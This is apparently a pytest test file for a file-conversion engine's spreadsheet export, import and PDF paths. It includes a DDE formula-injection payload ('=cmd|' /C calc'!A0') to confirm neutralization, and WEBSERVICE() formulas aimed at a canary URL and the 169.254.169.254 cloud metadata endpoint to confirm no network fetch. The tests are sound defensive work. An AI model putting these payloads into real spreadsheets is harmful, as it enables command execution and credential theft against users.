"""Spreadsheets: matrix, computed values, injection guard, WEBSERVICE canary, negatives."""

from __future__ import annotations

import csv
import json

import pytest
from conftest import convert, pairs_of
from fixtures.generate import KNOWN_SENTENCE, path

from engine.validators.docs import validate_pdf


def book_rows(p, fmt, sheet=0):
    if fmt == "xlsx":
        from openpyxl import load_workbook

        wb = load_workbook(p, data_only=True)
        return [ws.title for ws in wb.worksheets], [[c.value for c in r] for r in wb.worksheets[sheet].iter_rows()]
    if fmt == "xls":
        import xlrd

        b = xlrd.open_workbook(p)
        sh = b.sheet_by_index(sheet)
        return b.sheet_names(), [sh.row_values(i) for i in range(sh.nrows)]
    import pandas as pd

    frames = pd.read_excel(p, sheet_name=None, header=None, engine="odf")
    names = list(frames)
    return names, frames[names[sheet]].values.tolist()


def _num(v):
    return float(v) if v not in (None, "") else None


@pytest.mark.parametrize("src,dst", pairs_of("sheet.export"))
def test_export_matrix(src, dst):
    r = convert("sheet.export", path(f"spreadsheet.{src}"), dst)
    assert r.ok, r.error
    assert len(r.outputs) == 1
    if dst == "json":
        data = json.loads(r.out.read_text())
        assert data[1] == {"Name": "Banana", "Qty": 12, "Price": 0.25, "Total": 3}
    else:
        rows = list(csv.reader(r.out.open(), delimiter="\t" if dst == "tsv" else ","))
        assert rows[0] == ["Name", "Qty", "Price", "Total"]
        assert rows[3][0] == "Cherry" and _num(rows[3][3]) == 28  # computed value, not "=B4*C4"
    assert any("2 sheets" in n for n in r.notices)


@pytest.mark.verifies("sheet.export:xlsx->csv", "sheet.export:ods->json")
def test_export_all_sheets_and_pick():
    r = convert("sheet.export", path("spreadsheet.xlsx"), "csv", {"all_sheets": True})
    assert sorted(p.name for p, _ in r.outputs) == ["Fruit.csv", "Notes.csv"]
    r = convert("sheet.export", path("spreadsheet.ods"), "json", {"sheet": "Notes"})
    assert json.loads(r.out.read_text()) == [{"Note": KNOWN_SENTENCE}]
    r = convert("sheet.export", path("spreadsheet.xlsx"), "json", {"sheet": "2", "header_row": False})
    assert json.loads(r.out.read_text())[1] == [KNOWN_SENTENCE]


@pytest.mark.verifies("sheet.export:xlsx->csv", "neg:sheet.export")
def test_export_neutralizes_formula_injection(tmp_path):
    from openpyxl import Workbook

    wb = Workbook()
    wb.active.append(["=cmd|' /C calc'!A0", "+1+1", "-2", "@SUM(1)", "-x", 5])
    p = tmp_path / "inj.xlsx"
    for c in wb.active[1][:5]:
        c.data_type = "s"
    wb.save(p)
    r = convert("sheet.export", p, "csv", formats=["xlsx"])
    row = next(csv.reader(r.out.open()))
    assert row == ["'=cmd|' /C calc'!A0", "'+1+1", "-2", "'@SUM(1)", "'-x", "5"]
    r = convert("sheet.export", p, "csv", {"neutralize_formulas": False}, formats=["xlsx"])
    assert next(csv.reader(r.out.open()))[0] == "=cmd|' /C calc'!A0"


@pytest.mark.verifies("neg:sheet.export")
def test_export_unknown_sheet_and_corrupt(tmp_path):
    r = convert("sheet.export", path("spreadsheet.xlsx"), "csv", {"sheet": "Nope"})
    assert not r.ok and "Fruit, Notes" in r.error["message"]
    bad = tmp_path / "b.xlsx"
    bad.write_bytes(path("spreadsheet.xlsx").read_bytes()[:2000])
    r = convert("sheet.export", bad, "csv", formats=["xlsx"])
    assert not r.ok and r.error["code"] == "corrupt_input"


@pytest.mark.parametrize("src,dst", pairs_of("sheet.import"))
def test_import_matrix(src, dst):
    r = convert("sheet.import", path(f"data.{src}"), dst)
    assert r.ok, r.error
    names, rows = book_rows(r.out, dst)
    assert names == ["Sheet1"]
    if src == "json":
        assert rows[0][:4] == ["name", "qty", "price", "origin.country"]
        assert "origin.farm.id" in rows[0] and "tags" in rows[0]
        assert rows[1][0] == "Apple" and _num(rows[2][1]) == 12
        assert json.loads(rows[1][rows[0].index("tags")]) == ["red", "crisp"]
    else:
        assert rows[0][:3] == ["Name", "Qty", "Price"]
        assert rows[2][0] == "Banana" and _num(rows[2][1]) == 12 and _num(rows[2][2]) == 0.25


@pytest.mark.verifies("sheet.import:csv->xlsx")
def test_import_csv_keeps_formula_text_as_data_and_detects_dialect():
    r = convert("sheet.import", path("data.csv"), "xlsx")
    from openpyxl import load_workbook

    ws = load_workbook(r.out).active
    assert ws["D3"].value == '=HYPERLINK("http://x")' and ws["D3"].data_type == "s"
    assert ws["D2"].value == "crisp, red" and ws["A5"].value == "Dürüm"
    r = convert("sheet.import", path("data-semicolon.csv"), "xlsx", formats=["csv"])
    ws = load_workbook(r.out).active
    assert ws["A4"].value == "Café" and ws["B3"].value == 12
    assert any("separator" in n for n in r.notices)


@pytest.mark.verifies("neg:sheet.import")
def test_import_rejects_non_tabular_json(tmp_path):
    p = tmp_path / "x.json"
    p.write_text('{"not": "an array"}')
    r = convert("sheet.import", p, "xlsx", formats=["json"])
    assert not r.ok and "array of objects" in r.error["message"]


@pytest.mark.parametrize("src,dst", pairs_of("sheet.office"))
def test_office_book_matrix(src, dst):
    r = convert("sheet.office", path(f"spreadsheet.{src}"), dst, timeout=180)
    assert r.ok, r.error
    names, rows = book_rows(r.out, dst)
    assert names == ["Fruit", "Notes"]  # all sheets preserved
    assert rows[3][0] == "Cherry" and _num(rows[3][3]) == 28


@pytest.mark.verifies("neg:sheet.office")
def test_office_book_corrupt(tmp_path):
    bad = tmp_path / "b.ods"
    bad.write_bytes(path("spreadsheet.ods").read_bytes()[:1500])
    r = convert("sheet.office", bad, "xlsx", formats=["ods"], timeout=180)
    assert not r.ok


@pytest.mark.parametrize("src,dst", pairs_of("sheet.to_pdf"))
def test_sheet_to_pdf_matrix(src, dst):
    fx = path("data.csv") if src == "csv" else path(f"spreadsheet.{src}")
    r = convert("sheet.to_pdf", fx, "pdf", timeout=180)
    assert r.ok, r.error
    validate_pdf(r.out, contains=["Banana"])
    if src != "csv":
        validate_pdf(r.out, pages=2, contains=["Cherry", KNOWN_SENTENCE])  # one page per sheet


@pytest.mark.verifies("neg:sheet.to_pdf", "sheet.to_pdf:xlsx->pdf")
def test_webservice_formula_never_fetches(tmp_path):
    """A spreadsheet with WEBSERVICE() must not reach the network during conversion."""
    from openpyxl import Workbook
    from test_security import Canary

    c = Canary()
    try:
        wb = Workbook()
        ws = wb.active
        ws["A1"] = "Leak test"
        ws["A2"] = f'=WEBSERVICE("{c.url}/leak?x=1")'
        ws["A3"] = f'=FILTERXML(WEBSERVICE("{c.url}/xml"),"//a")'
        ws["A4"] = '=WEBSERVICE("http://169.254.169.254/latest/meta-data/")'
        p = tmp_path / "ws.xlsx"
        wb.save(p)
        for op, tgt in (("sheet.to_pdf", "pdf"), ("sheet.office", "ods")):
            r = convert(op, p, tgt, formats=["xlsx"], timeout=180)
            assert r.ok, r.error
        assert c.hits == []
    finally:
        c.close()
